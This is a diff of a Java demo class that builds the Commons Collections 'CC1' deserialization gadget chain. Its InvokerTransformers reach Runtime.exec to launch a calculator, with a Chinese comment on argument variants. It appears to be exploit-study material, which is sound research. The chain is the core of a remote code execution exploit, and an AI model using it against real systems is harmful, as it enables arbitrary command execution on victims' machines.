@@ -16,11 +16,19 @@ import java.util.Map;
  */
 public class CC1Demo2 {
     public static void main(String[] args) {
+        // null 可以用new Class[0] 或者 new Object() 代替
+//        Transformer[] transformers = new Transformer[]{
+//                new ConstantTransformer(Runtime.class),
+//                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
+//                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
+//                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a Calculator"})
+//        };
+
         Transformer[] transformers = new Transformer[]{
                 new ConstantTransformer(Runtime.class),
                 new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
-                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Class[0]}),
-                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a Calculator"})
+                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{new Object(), new Object[0]}),
+                new InvokerTransformer("exec", new Class[]{String.class}, new String[]{"open -a Calculator"})
         };
 
         ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
